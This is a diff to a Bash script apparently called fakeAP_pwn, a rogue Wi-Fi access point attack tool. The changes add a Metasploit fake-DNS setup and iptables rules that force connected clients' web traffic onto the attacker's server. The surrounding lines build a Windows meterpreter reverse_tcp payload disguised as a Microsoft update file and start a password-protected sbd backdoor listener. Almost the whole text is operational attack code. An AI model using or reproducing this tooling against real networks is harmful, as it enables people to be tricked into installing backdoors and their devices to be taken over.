@@ -5,7 +5,7 @@
 # Make sure to copy "www": cp -rf www/* /var/www/fakeAP_pwn                                    #
 # The VNC password is "g0tmi1k" (without "")                                                   #
 #---ToDo---------------------------------------------------------------------------------------#
-# v0.4 - hostapd          - Add support for hostapd & Hardware AP                             #
+# v0.4 - hostapd          - Add support for hostapd & Hardware AP                              #
 # v0.4 - Multiple clients - Each time a new client connects they will be redirected to our     #
 #                           crafted page without affecting any other clients who are browsing  #
 #                           Create a captive portal with:                                      #
@@ -625,7 +625,7 @@ subnet 10.0.0.0 netmask 255.255.255.0 {
   option subnet-mask 255.255.255.0;
   option broadcast-address 10.0.0.255;
   option domain-name \"Home.com\";
-  option domain-name-servers $gatewayIP;   # OR    option domain-name-servers 10.0.0.1;
+  option domain-name-servers 10.0.0.1;
   option netbios-name-servers 10.0.0.99; # The NetBIOS name server (WINS)
 }" > /tmp/fakeAP_pwn.dhcp
 if [ "$verbose" == "2" ] ; then echo "Created: /tmp/fakeAP_pwn.dhcp"; fi
@@ -691,6 +691,18 @@ echo "<VirtualHost *:80>
 if [ "$verbose" == "2" ] ; then echo "Created: /etc/apache2/sites-available/fakeAP_pwn"; fi
 if [ "$debug" == "true" ]; then cat /etc/apache2/sites-available/fakeAP_pwn; fi
 
+# dns script
+if [ "$apMode" == "non" ]; then
+echo "use auxiliary/server/fakedns
+set INTERFACE at0
+set SRVHOST 0.0.0.0
+set SRVPORT 53
+set TARGETHOST 10.0.0.1
+run" > /tmp/fakeAP_pwn.rc
+   if [ "$verbose" == "2" ] ; then echo "Created: /tmp/fakeAP_pwn.rc"; fi
+   if [ "$debug" == "true" ] ; then cat /tmp/fakeAP_pwn.rc; fi
+fi
+
 #----------------------------------------------------------------------------------------------#
 if [ "$apMode" != "normal" ]; then
    #echo -e "\e[01;32m[>]\e[00m Creating exploit.(Linux)"
@@ -704,6 +716,7 @@ if [ "$apMode" != "normal" ]; then
    #$xterm -geometry 75x15+10+0 -T "fakeAP_pwn v$version - Metasploit (Windows)" -e "$metasploitPath/msfpayload windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4564 X > $htdocsPath/Windows-KB183905-x86-ENU.exe"
    #if [ "$verbose" == "2" ] ; then echo "Command: $metasploitPath/msfpayload windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4564 R | $metasploitPath/msfencode -e x86/shikata_ga_nai -c 5 -t raw | $metasploitPath/msfencode -e x86/countdown -c 2 -t raw | $metasploitPath/msfencode -e x86/shikata_ga_nai -c 5 -t raw | $metasploitPath/msfencode -x $htdocsPath/sbd.exe -t exe -e x86/call4_dword_xor -c 2 -o $htdocsPath/Windows-KB183905-x86-ENU.exe"; fi
    #$xterm -geometry 75x15+10+0 -T "fakeAP_pwn v$version - Metasploit (Windows)" -e "$metasploitPath/msfpayload windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4564 R | $metasploitPath/msfencode -e x86/shikata_ga_nai -c 5 -t raw | $metasploitPath/msfencode -e x86/countdown -c 2 -t raw | $metasploitPath/msfencode -e x86/shikata_ga_nai -c 5 -t raw | $metasploitPath/msfencode -x $htdocsPath/sbd.exe -t exe -e x86/call4_dword_xor -c 2 -o $htdocsPath/Windows-KB183905-x86-ENU.exe"
+   if [ ! -e $htdocsPath/sbd.exe ] ; then echo -e "\e[00;31m[-]\e[00m sbd.exe is not in $htdocsPath"; fi 
    command="$metasploitPath/msfpayload windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4564 R | $metasploitPath/msfencode -x $htdocsPath/sbd.exe -t exe -e x86/shikata_ga_nai -c 10 -o $htdocsPath/Windows-KB183905-x86-ENU.exe"
    if [ "$verbose" == "2" ] ; then echo "Command: $command"; fi
    $xterm -geometry 75x15+10+0 -T "fakeAP_pwn v$version - Metasploit (Windows)" -e "$command"
@@ -743,14 +756,14 @@ if [ $command != "1" ]; then
   echo -e "\e[00;31m[-]\e[00m Can't enable ip_forward" 1>&2
   cleanup
 fi
-if [ "$apMode" == "normal" ]; then
-   iptables --table nat --append POSTROUTING --out-interface $interface --jump MASQUERADE   # ...and send it on to the internet (for now, we will redirct later (once we are ready!))
-   iptables --append FORWARD --in-interface at0 --jump ACCEPT                              # Get everything on the fakeAP # Allow at0 interface connections to be forwarded through other interfaces
-   iptables --table nat --append PREROUTING --proto udp --jump DNAT --to $gatewayIP         # Change destination addresses to the connection with internet
-elif [ "$apMode" == "transparent" ] || [ "$apMode" == "non" ]; then
-   iptables --table nat --append PREROUTING --in-interface at0 --jump REDIRECT                       # Blackhole Routing - will redirect all network traffic on the AP interface back to the system. (cache)
-   #iptables --table nat --append PREROUTING --proto tcp --jump DNAT --to-destination 64.111.96.38    # Blackhole Routing - Send everything to that IP address
+if [ "$apMode" == "transparent" ] || [ "$apMode" == "normal" ]; then
+   iptables --table nat --append POSTROUTING --out-interface $interface --jump MASQUERADE     # ...and send it on to the internet (for now, we will redirct later (once we are ready!))
+   iptables --append FORWARD --in-interface at0 --jump ACCEPT                                 # Get everything on the fakeAP # Allow at0 interface connections to be forwarded through other interfaces
+   iptables --table nat --append PREROUTING --proto udp --jump DNAT --to $gatewayIP           # Change destination addresses to the connection with internet
+elif [ "$apMode" == "non" ]; then
+   iptables --table nat --append PREROUTING --in-interface at0 --jump REDIRECT                # Blackhole Routing - will redirect all network traffic on the AP interface back to the system. (cache)
 fi
+
 # DHCP
 if [ "$verbose" == "2" ] ; then echo "Command: chmod 775 /var/run/"; fi
 $xterm -geometry 75x7+100+0 -T "fakeAP_pwn v$version - DHCP" -e "chmod 775 /var/run/"
@@ -786,6 +799,15 @@ if [ "$apMode" != "normal" ]; then
    fi
 
 #----------------------------------------------------------------------------------------------#
+
+if [ "$apMode" == "non" ]; then
+   echo -e "\e[01;32m[>]\e[00m Starting DNS services..."
+   if [ "$verbose" == "2" ] ; then echo "Command: $metasploitPath/msfconsole -r /tmp/fakeAP_pwn.rc"; fi
+   $xterm -geometry 75x3+10+145 -T "fakeAP_pwn v$version - FakeDNS" -e "$metasploitPath/msfconsole -r /tmp/fakeAP_pwn.rc" &
+   sleep 7
+fi
+
+#----------------------------------------------------------------------------------------------#
    echo -e "\e[01;32m[>]\e[00m Starting Web server..."
    if [ "$verbose" == "2" ] ; then echo "Command: /etc/init.d/apache2 start && ls /etc/apache2/sites-available/ | xargs a2dissite && a2ensite fakeAP_pwn && a2enmod ssl && /etc/init.d/apache2 reload"; fi
    $xterm -geometry 75x10+100+0 -T "fakeAP_pwn v$version - Web Sever" -e "/etc/init.d/apache2 start && ls /etc/apache2/sites-available/ | xargs a2dissite && a2ensite fakeAP_pwn && a2enmod ssl && /etc/init.d/apache2 reload" & #dissable all sites and only enable the fakeAP_pwn one
@@ -807,6 +829,14 @@ if [ "$apMode" != "normal" ]; then
       $xterm -geometry 75x22+10+440 -T "fakeAP_pwn v$version - SBD" -e "sbd -l -k g0tmi1k -p $port" &
       sleep 1
    fi
+
+echo -e "\e[01;32m[>]\e[00m Forcing target to vist our site..."
+# Could of done this at the start, but we were not ready for them then! JUST PORT 80,443 MIND YOU! (All other traffic (e.g. NON HTTP) might have internet access)
+if [ "$verbose" == "2" ] ; then echo "Command: iptables -t nat -A PREROUTING -i at0 -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1"; fi
+if [ "$verbose" == "2" ] ; then echo "Command: iptables -t nat -A PREROUTING -i at0 -p tcp --dport 443 -j DNAT --to-destination 10.0.0.1"; fi
+iptables -t nat -A PREROUTING -i at0 -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1
+iptables -t nat -A PREROUTING -i at0 -p tcp --dport 443 -j DNAT --to-destination 10.0.0.1
+sleep 1
 
 #----------------------------------------------------------------------------------------------#
    # Wait till target is infected (It's checking for a file to be created by the metasploit script (fakeAP_pwn.rb))
